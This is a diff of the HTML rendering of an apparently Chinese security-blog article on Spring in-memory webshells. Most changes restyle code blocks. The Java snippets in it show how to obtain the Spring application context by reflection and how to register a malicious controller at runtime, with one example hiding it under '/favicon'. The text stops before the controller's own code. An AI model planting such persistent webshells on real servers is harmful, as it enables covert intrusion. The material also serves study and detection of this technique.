-</span></span></span></code></pre></div><h5 id="getattribute"><strong>getAttribute</strong><a hidden class="anchor" aria-hidden="true" href="#getattribute">#</a></h5>
+<div class="code-block-container" data-expanded="true">
+    <div class="code-header">
+        <div class="mac-buttons">
+            <span class="mac-button red"></span>
+            <span class="mac-button yellow"></span>
+            <span class="mac-button green"></span>
+        </div>
+        <span class="code-language">java</span>
+        <div class="code-actions">
+            <button class="copy-btn" title="Copy">
+                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
+            </button>
+            <button class="toggle-btn" title="Toggle">
+                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-down"><polyline points="6 9 12 15 18 9"></polyline></svg>
+            </button>
+        </div>
+    </div>
+    <div class="code-content"><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt" id="1"><a class="lnlinks" href="#1">1</a>
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">WebApplicationContext</span><span class="w"> </span><span class="n">context</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">RequestContextUtils</span><span class="p">.</span><span class="na">getWebApplicationContext</span><span class="p">(((</span><span class="n">ServletRequestAttributes</span><span class="p">)</span><span class="n">RequestContextHolder</span><span class="p">.</span><span class="na">currentRequestAttributes</span><span class="p">()).</span><span class="na">getRequest</span><span class="p">());</span></span></span></code></pre></td></tr></table>
+</div>
+</div></div>
+</div><h5 id="getattribute"><strong>getAttribute</strong><a hidden class="anchor" aria-hidden="true" href="#getattribute">#</a></h5>
 <p>这种方式与前几种的思路就不太一样了，因为所有的Context在创建后，都会被作为一个属性添加到了ServletContext中。所以通过直接获得ServletContext通过属性Context拿到 Child WebApplicationContext</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">WebApplicationContext</span><span class="w"> </span><span class="n">context</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">WebApplicationContext</span><span class="p">)</span><span class="n">RequestContextHolder</span><span class="p">.</span><span class="na">currentRequestAttributes</span><span class="p">().</span><span class="na">getAttribute</span><span class="p">(</span><span class="s">&#34;org.springframework.web.servlet.DispatcherServlet.CONTEXT&#34;</span><span class="p">,</span><span class="w"> </span><span class="n">0</span><span class="p">);</span><span class="w">
-</span></span></span></code></pre></div><h5 id="反射获取">反射获取<a hidden class="anchor" aria-hidden="true" href="#反射获取">#</a></h5>
+<div class="code-block-container" data-expanded="true">
+    <div class="code-header">
+        <div class="mac-buttons">
+            <span class="mac-button red"></span>
+            <span class="mac-button yellow"></span>
+            <span class="mac-button green"></span>
+        </div>
+        <span class="code-language">java</span>
+        <div class="code-actions">
+            <button class="copy-btn" title="Copy">
+                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
+            </button>
+            <button class="toggle-btn" title="Toggle">
+                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-down"><polyline points="6 9 12 15 18 9"></polyline></svg>
+            </button>
+        </div>
+    </div>
+    <div class="code-content"><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt" id="1"><a class="lnlinks" href="#1">1</a>
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">WebApplicationContext</span><span class="w"> </span><span class="n">context</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">WebApplicationContext</span><span class="p">)</span><span class="n">RequestContextHolder</span><span class="p">.</span><span class="na">currentRequestAttributes</span><span class="p">().</span><span class="na">getAttribute</span><span class="p">(</span><span class="s">&#34;org.springframework.web.servlet.DispatcherServlet.CONTEXT&#34;</span><span class="p">,</span><span class="w"> </span><span class="n">0</span><span class="p">);</span></span></span></code></pre></td></tr></table>
+</div>
+</div></div>
+</div><h5 id="反射获取">反射获取<a hidden class="anchor" aria-hidden="true" href="#反射获取">#</a></h5>
 <p>还可以通过反射获取<code>LiveBeansView</code>类的<code>applicationContexts</code> 属性来获取上下文。</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="c1">// 1. 反射 org.springframework.context.support.LiveBeansView 类 applicationContexts 属性</span><span class="w">
+<div class="code-block-container" data-expanded="true">
+    <div class="code-header">
+        <div class="mac-buttons">
+            <span class="mac-button red"></span>
+            <span class="mac-button yellow"></span>
+            <span class="mac-button green"></span>
+        </div>
+        <span class="code-language">java</span>
+        <div class="code-actions">
+            <button class="copy-btn" title="Copy">
+                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
+            </button>
+            <button class="toggle-btn" title="Toggle">
+                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-down"><polyline points="6 9 12 15 18 9"></polyline></svg>
+            </button>
+        </div>
+    </div>
+    <div class="code-content"><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt" id="1"><a class="lnlinks" href="#1">1</a>
+</span><span class="lnt" id="2"><a class="lnlinks" href="#2">2</a>
+</span><span class="lnt" id="3"><a class="lnlinks" href="#3">3</a>
+</span><span class="lnt" id="4"><a class="lnlinks" href="#4">4</a>
+</span><span class="lnt" id="5"><a class="lnlinks" href="#5">5</a>
+</span><span class="lnt" id="6"><a class="lnlinks" href="#6">6</a>
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="c1">// 1. 反射 org.springframework.context.support.LiveBeansView 类 applicationContexts 属性</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="n">java</span><span class="p">.</span><span class="na">lang</span><span class="p">.</span><span class="na">reflect</span><span class="p">.</span><span class="na">Field</span><span class="w"> </span><span class="n">filed</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Class</span><span class="p">.</span><span class="na">forName</span><span class="p">(</span><span class="s">&#34;org.springframework.context.support.LiveBeansView&#34;</span><span class="p">).</span><span class="na">getDeclaredField</span><span class="p">(</span><span class="s">&#34;applicationContexts&#34;</span><span class="p">);</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="c1">// 2. 属性被 private 修饰，所以 setAccessible true</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="n">filed</span><span class="p">.</span><span class="na">setAccessible</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="c1">// 3. 获取一个 ApplicationContext 实例</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="n">org</span><span class="p">.</span><span class="na">springframework</span><span class="p">.</span><span class="na">web</span><span class="p">.</span><span class="na">context</span><span class="p">.</span><span class="na">WebApplicationContext</span><span class="w"> </span><span class="n">context</span><span class="w"> </span><span class="o">=</span><span class="p">(</span><span class="n">org</span><span class="p">.</span><span class="na">springframework</span><span class="p">.</span><span class="na">web</span><span class="p">.</span><span class="na">context</span><span class="p">.</span><span class="na">WebApplicationContext</span><span class="p">)</span><span class="w"> </span><span class="p">((</span><span class="n">java</span><span class="p">.</span><span class="na">util</span><span class="p">.</span><span class="na">LinkedHashSet</span><span class="p">)</span><span class="n">filed</span><span class="p">.</span><span class="na">get</span><span class="p">(</span><span class="kc">null</span><span class="p">)).</span><span class="na">iterator</span><span class="p">().</span><span class="na">next</span><span class="p">();</span><span class="w">
-</span></span></span></code></pre></div><p><code>org.springframework.context.support.LiveBeansView</code> 类在 <code>spring-context</code> 3.2.x 版本（现在最新版本是 5.3.x）才加入其中，所以比较低版本的 spring 无法通过此方法获得 <code>ApplicationContext</code> 的实例。</p>
+</span></span></span><span class="line"><span class="cl"><span class="n">org</span><span class="p">.</span><span class="na">springframework</span><span class="p">.</span><span class="na">web</span><span class="p">.</span><span class="na">context</span><span class="p">.</span><span class="na">WebApplicationContext</span><span class="w"> </span><span class="n">context</span><span class="w"> </span><span class="o">=</span><span class="p">(</span><span class="n">org</span><span class="p">.</span><span class="na">springframework</span><span class="p">.</span><span class="na">web</span><span class="p">.</span><span class="na">context</span><span class="p">.</span><span class="na">WebApplicationContext</span><span class="p">)</span><span class="w"> </span><span class="p">((</span><span class="n">java</span><span class="p">.</span><span class="na">util</span><span class="p">.</span><span class="na">LinkedHashSet</span><span class="p">)</span><span class="n">filed</span><span class="p">.</span><span class="na">get</span><span class="p">(</span><span class="kc">null</span><span class="p">)).</span><span class="na">iterator</span><span class="p">().</span><span class="na">next</span><span class="p">();</span></span></span></code></pre></td></tr></table>
+</div>
+</div></div>
+</div><p><code>org.springframework.context.support.LiveBeansView</code> 类在 <code>spring-context</code> 3.2.x 版本（现在最新版本是 5.3.x）才加入其中，所以比较低版本的 spring 无法通过此方法获得 <code>ApplicationContext</code> 的实例。</p>
 <h4 id="132-注册-controller">1.3.2 注册 Controller<a hidden class="anchor" aria-hidden="true" href="#132-注册-controller">#</a></h4>
 <p>Spring Controller 的动态注册，就是对 <code>RequestMappingHandlerMapping</code> 注入的过程。</p>
 <p>Spring 2.5 开始到 Spring 3.1 之前一般使用
@@ -406,7 +706,39 @@
 </ol>
 <h5 id="registermapping">registerMapping<a hidden class="anchor" aria-hidden="true" href="#registermapping">#</a></h5>
 <p>在Spring 4.0及以后，可以使用registerMapping直接注册requestMapping</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="c1">// 1. 从当前上下文环境中获得 RequestMappingHandlerMapping 的实例 bean</span><span class="w">
+<div class="code-block-container" data-expanded="true">
+    <div class="code-header">
+        <div class="mac-buttons">
+            <span class="mac-button red"></span>
+            <span class="mac-button yellow"></span>
+            <span class="mac-button green"></span>
+        </div>
+        <span class="code-language">java</span>
+        <div class="code-actions">
+            <button class="copy-btn" title="Copy">
+                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
+            </button>
+            <button class="toggle-btn" title="Toggle">
+                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-down"><polyline points="6 9 12 15 18 9"></polyline></svg>
+            </button>
+        </div>
+    </div>
+    <div class="code-content"><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt" id="1"><a class="lnlinks" href="#1"> 1</a>
+</span><span class="lnt" id="2"><a class="lnlinks" href="#2"> 2</a>
+</span><span class="lnt" id="3"><a class="lnlinks" href="#3"> 3</a>
+</span><span class="lnt" id="4"><a class="lnlinks" href="#4"> 4</a>
+</span><span class="lnt" id="5"><a class="lnlinks" href="#5"> 5</a>
+</span><span class="lnt" id="6"><a class="lnlinks" href="#6"> 6</a>
+</span><span class="lnt" id="7"><a class="lnlinks" href="#7"> 7</a>
+</span><span class="lnt" id="8"><a class="lnlinks" href="#8"> 8</a>
+</span><span class="lnt" id="9"><a class="lnlinks" href="#9"> 9</a>
+</span><span class="lnt" id="10"><a class="lnlinks" href="#10">10</a>
+</span><span class="lnt" id="11"><a class="lnlinks" href="#11">11</a>
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="c1">// 1. 从当前上下文环境中获得 RequestMappingHandlerMapping 的实例 bean</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="n">RequestMappingHandlerMapping</span><span class="w"> </span><span class="n">r</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">context</span><span class="p">.</span><span class="na">getBean</span><span class="p">(</span><span class="n">RequestMappingHandlerMapping</span><span class="p">.</span><span class="na">class</span><span class="p">);</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="c1">// 2. 通过反射获得自定义 controller 中唯一的 Method 对象</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="n">Method</span><span class="w"> </span><span class="n">method</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">Class</span><span class="p">.</span><span class="na">forName</span><span class="p">(</span><span class="s">&#34;me.landgrey.SSOLogin&#34;</span><span class="p">).</span><span class="na">getDeclaredMethods</span><span class="p">())</span><span class="o">[</span><span class="n">0</span><span class="o">]</span><span class="p">;</span><span class="w">
@@ -416,13 +748,45 @@
 </span></span></span><span class="line"><span class="cl"><span class="n">RequestMethodsRequestCondition</span><span class="w"> </span><span class="n">ms</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">RequestMethodsRequestCondition</span><span class="p">();</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="c1">// 5. 在内存中动态注册 controller</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="n">RequestMappingInfo</span><span class="w"> </span><span class="n">info</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">RequestMappingInfo</span><span class="p">(</span><span class="n">url</span><span class="p">,</span><span class="w"> </span><span class="n">ms</span><span class="p">,</span><span class="w"> </span><span class="kc">null</span><span class="p">,</span><span class="w"> </span><span class="kc">null</span><span class="p">,</span><span class="w"> </span><span class="kc">null</span><span class="p">,</span><span class="w"> </span><span class="kc">null</span><span class="p">,</span><span class="w"> </span><span class="kc">null</span><span class="p">);</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="n">r</span><span class="p">.</span><span class="na">registerMapping</span><span class="p">(</span><span class="n">info</span><span class="p">,</span><span class="w"> </span><span class="n">Class</span><span class="p">.</span><span class="na">forName</span><span class="p">(</span><span class="s">&#34;恶意Controller&#34;</span><span class="p">).</span><span class="na">newInstance</span><span class="p">(),</span><span class="w"> </span><span class="n">method</span><span class="p">);</span><span class="w">
-</span></span></span></code></pre></div><h5 id="registerhandler">registerHandler<a hidden class="anchor" aria-hidden="true" href="#registerhandler">#</a></h5>
+</span></span></span><span class="line"><span class="cl"><span class="n">r</span><span class="p">.</span><span class="na">registerMapping</span><span class="p">(</span><span class="n">info</span><span class="p">,</span><span class="w"> </span><span class="n">Class</span><span class="p">.</span><span class="na">forName</span><span class="p">(</span><span class="s">&#34;恶意Controller&#34;</span><span class="p">).</span><span class="na">newInstance</span><span class="p">(),</span><span class="w"> </span><span class="n">method</span><span class="p">);</span></span></span></code></pre></td></tr></table>
+</div>
+</div></div>
+</div><h5 id="registerhandler">registerHandler<a hidden class="anchor" aria-hidden="true" href="#registerhandler">#</a></h5>
 <p>参考上面的 <code>HandlerMapping</code> 接口继承关系图，针对使用 <code>DefaultAnnotationHandlerMapping</code> 映射器的应用，可以找到它继承的顶层类<code>org.springframework.web.servlet.handler.AbstractUrlHandlerMapping</code></p>
 <p>在其<code>registerHandler()</code>方法中</p>
 <p><img alt="img" decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081518808.png" style="max-width: 100%; height: auto;"></p>
 <p>该方法接受 <code>urlPath</code>参数和 <code>handler</code>参数，可以在 <code>this.getApplicationContext()</code> 获得的上下文环境中寻找名字为 <code>handler</code> 参数值的 <code>bean</code>, 将 url 和 controller 实例 bean 注册到 <code>handlerMap</code> 中</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="c1">// 1. 在当前上下文环境中注册一个名为 dynamicController 的 Webshell controller 实例 bean</span><span class="w">
+<div class="code-block-container" data-expanded="true">
+    <div class="code-header">
+        <div class="mac-buttons">
+            <span class="mac-button red"></span>
+            <span class="mac-button yellow"></span>
+            <span class="mac-button green"></span>
+        </div>
+        <span class="code-language">java</span>
+        <div class="code-actions">
+            <button class="copy-btn" title="Copy">
+                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
+            </button>
+            <button class="toggle-btn" title="Toggle">
+                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-down"><polyline points="6 9 12 15 18 9"></polyline></svg>
+            </button>
+        </div>
+    </div>
+    <div class="code-content"><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt" id="1"><a class="lnlinks" href="#1">1</a>
+</span><span class="lnt" id="2"><a class="lnlinks" href="#2">2</a>
+</span><span class="lnt" id="3"><a class="lnlinks" href="#3">3</a>
+</span><span class="lnt" id="4"><a class="lnlinks" href="#4">4</a>
+</span><span class="lnt" id="5"><a class="lnlinks" href="#5">5</a>
+</span><span class="lnt" id="6"><a class="lnlinks" href="#6">6</a>
+</span><span class="lnt" id="7"><a class="lnlinks" href="#7">7</a>
+</span><span class="lnt" id="8"><a class="lnlinks" href="#8">8</a>
+</span><span class="lnt" id="9"><a class="lnlinks" href="#9">9</a>
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="c1">// 1. 在当前上下文环境中注册一个名为 dynamicController 的 Webshell controller 实例 bean</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="n">context</span><span class="p">.</span><span class="na">getBeanFactory</span><span class="p">().</span><span class="na">registerSingleton</span><span class="p">(</span><span class="s">&#34;dynamicController&#34;</span><span class="p">,</span><span class="w"> </span><span class="n">Class</span><span class="p">.</span><span class="na">forName</span><span class="p">(</span><span class="s">&#34;me.landgrey.SSOLogin&#34;</span><span class="p">).</span><span class="na">newInstance</span><span class="p">());</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="c1">// 2. 从当前上下文环境中获得 DefaultAnnotationHandlerMapping 的实例 bean</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="n">org</span><span class="p">.</span><span class="na">springframework</span><span class="p">.</span><span class="na">web</span><span class="p">.</span><span class="na">servlet</span><span class="p">.</span><span class="na">mvc</span><span class="p">.</span><span class="na">annotation</span><span class="p">.</span><span class="na">DefaultAnnotationHandlerMapping</span><span class="w">  </span><span class="n">dh</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">context</span><span class="p">.</span><span class="na">getBean</span><span class="p">(</span><span class="n">org</span><span class="p">.</span><span class="na">springframework</span><span class="p">.</span><span class="na">web</span><span class="p">.</span><span class="na">servlet</span><span class="p">.</span><span class="na">mvc</span><span class="p">.</span><span class="na">annotation</span><span class="p">.</span><span class="na">DefaultAnnotationHandlerMapping</span><span class="p">.</span><span class="na">class</span><span class="p">);</span><span class="w">
@@ -430,17 +794,85 @@
 </span></span></span><span class="line"><span class="cl"><span class="n">java</span><span class="p">.</span><span class="na">lang</span><span class="p">.</span><span class="na">reflect</span><span class="p">.</span><span class="na">Method</span><span class="w"> </span><span class="n">m1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">org</span><span class="p">.</span><span class="na">springframework</span><span class="p">.</span><span class="na">web</span><span class="p">.</span><span class="na">servlet</span><span class="p">.</span><span class="na">handler</span><span class="p">.</span><span class="na">AbstractUrlHandlerMapping</span><span class="p">.</span><span class="na">class</span><span class="p">.</span><span class="na">getDeclaredMethod</span><span class="p">(</span><span class="s">&#34;registerHandler&#34;</span><span class="p">,</span><span class="w"> </span><span class="n">String</span><span class="p">.</span><span class="na">class</span><span class="p">,</span><span class="w"> </span><span class="n">Object</span><span class="p">.</span><span class="na">class</span><span class="p">);</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="n">m1</span><span class="p">.</span><span class="na">setAccessible</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="c1">// 4. 将 dynamicController 和 URL 注册到 handlerMap 中</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="n">m1</span><span class="p">.</span><span class="na">invoke</span><span class="p">(</span><span class="n">dh</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;/favicon&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;dynamicController&#34;</span><span class="p">);</span><span class="w">
-</span></span></span></code></pre></div><h5 id="detecthandlermethods">detectHandlerMethods<a hidden class="anchor" aria-hidden="true" href="#detecthandlermethods">#</a></h5>
+</span></span></span><span class="line"><span class="cl"><span class="n">m1</span><span class="p">.</span><span class="na">invoke</span><span class="p">(</span><span class="n">dh</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;/favicon&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;dynamicController&#34;</span><span class="p">);</span></span></span></code></pre></td></tr></table>
+</div>
+</div></div>
+</div><h5 id="detecthandlermethods">detectHandlerMethods<a hidden class="anchor" aria-hidden="true" href="#detecthandlermethods">#</a></h5>
 <p><img alt="img" decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081518516.png" style="max-width: 100%; height: auto;"></p>
 <p>该方法仅接受<code>handler</code>参数，同样可以在 <code>this.getApplicationContext()</code> 获得的上下文环境中寻找名字为 <code>handler</code> 参数值的 <code>bean</code>, 并注册 <code>controller</code> 的实例 <code>bean</code></p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">context</span><span class="p">.</span><span class="na">getBeanFactory</span><span class="p">().</span><span class="na">registerSingleton</span><span class="p">(</span><span class="s">&#34;dynamicController&#34;</span><span class="p">,</span><span class="w"> </span><span class="n">Class</span><span class="p">.</span><span class="na">forName</span><span class="p">(</span><span class="s">&#34;恶意Controller&#34;</span><span class="p">).</span><span class="na">newInstance</span><span class="p">());</span><span class="w">
+<div class="code-block-container" data-expanded="true">
+    <div class="code-header">
+        <div class="mac-buttons">
+            <span class="mac-button red"></span>
+            <span class="mac-button yellow"></span>
+            <span class="mac-button green"></span>
+        </div>
+        <span class="code-language">java</span>
+        <div class="code-actions">
+            <button class="copy-btn" title="Copy">
+                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
+            </button>
+            <button class="toggle-btn" title="Toggle">
+                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-down"><polyline points="6 9 12 15 18 9"></polyline></svg>
+            </button>
+        </div>
+    </div>
+    <div class="code-content"><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt" id="1"><a class="lnlinks" href="#1">1</a>
+</span><span class="lnt" id="2"><a class="lnlinks" href="#2">2</a>
+</span><span class="lnt" id="3"><a class="lnlinks" href="#3">3</a>
+</span><span class="lnt" id="4"><a class="lnlinks" href="#4">4</a>
+</span><span class="lnt" id="5"><a class="lnlinks" href="#5">5</a>
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">context</span><span class="p">.</span><span class="na">getBeanFactory</span><span class="p">().</span><span class="na">registerSingleton</span><span class="p">(</span><span class="s">&#34;dynamicController&#34;</span><span class="p">,</span><span class="w"> </span><span class="n">Class</span><span class="p">.</span><span class="na">forName</span><span class="p">(</span><span class="s">&#34;恶意Controller&#34;</span><span class="p">).</span><span class="na">newInstance</span><span class="p">());</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="n">org</span><span class="p">.</span><span class="na">springframework</span><span class="p">.</span><span class="na">web</span><span class="p">.</span><span class="na">servlet</span><span class="p">.</span><span class="na">mvc</span><span class="p">.</span><span class="na">method</span><span class="p">.</span><span class="na">annotation</span><span class="p">.</span><span class="na">RequestMappingHandlerMapping</span><span class="w"> </span><span class="n">requestMappingHandlerMapping</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">context</span><span class="p">.</span><span class="na">getBean</span><span class="p">(</span><span class="n">org</span><span class="p">.</span><span class="na">springframework</span><span class="p">.</span><span class="na">web</span><span class="p">.</span><span class="na">servlet</span><span class="p">.</span><span class="na">mvc</span><span class="p">.</span><span class="na">method</span><span class="p">.</span><span class="na">annotation</span><span class="p">.</span><span class="na">RequestMappingHandlerMapping</span><span class="p">.</span><span class="na">class</span><span class="p">);</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="n">java</span><span class="p">.</span><span class="na">lang</span><span class="p">.</span><span class="na">reflect</span><span class="p">.</span><span class="na">Method</span><span class="w"> </span><span class="n">m1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">org</span><span class="p">.</span><span class="na">springframework</span><span class="p">.</span><span class="na">web</span><span class="p">.</span><span class="na">servlet</span><span class="p">.</span><span class="na">handler</span><span class="p">.</span><span class="na">AbstractHandlerMethodMapping</span><span class="p">.</span><span class="na">class</span><span class="p">.</span><span class="na">getDeclaredMethod</span><span class="p">(</span><span class="s">&#34;detectHandlerMethods&#34;</span><span class="p">,</span><span class="w"> </span><span class="n">Object</span><span class="p">.</span><span class="na">class</span><span class="p">);</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="n">m1</span><span class="p">.</span><span class="na">setAccessible</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="n">m1</span><span class="p">.</span><span class="na">invoke</span><span class="p">(</span><span class="n">requestMappingHandlerMapping</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;dynamicController&#34;</span><span class="p">);</span><span class="w">
-</span></span></span></code></pre></div><h4 id="133-实现恶意-controller">1.3.3 实现恶意 Controller<a hidden class="anchor" aria-hidden="true" href="#133-实现恶意-controller">#</a></h4>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">package</span><span class="w"> </span><span class="nn">com.src.springmem.demos.web</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="n">m1</span><span class="p">.</span><span class="na">invoke</span><span class="p">(</span><span class="n">requestMappingHandlerMapping</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;dynamicController&#34;</span><span class="p">);</span></span></span></code></pre></td></tr></table>
+</div>
+</div></div>
+</div><h4 id="133-实现恶意-controller">1.3.3 实现恶意 Controller<a hidden class="anchor" aria-hidden="true" href="#133-实现恶意-controller">#</a></h4>
+<div class="code-block-container" data-expanded="true">
+    <div class="code-header">
+        <div class="mac-buttons">
+            <span class="mac-button red"></span>
+            <span class="mac-button yellow"></span>
+            <span class="mac-button green"></span>
+        </div>
+        <span class="code-language">java</span>
+        <div class="code-actions">
+            <button class="copy-btn" title="Copy">
+                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
+            </button>
+            <button class="toggle-btn" title="Toggle">
+                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-down"><polyline points="6 9 12 15 18 9"></polyline></svg>
+            </button>
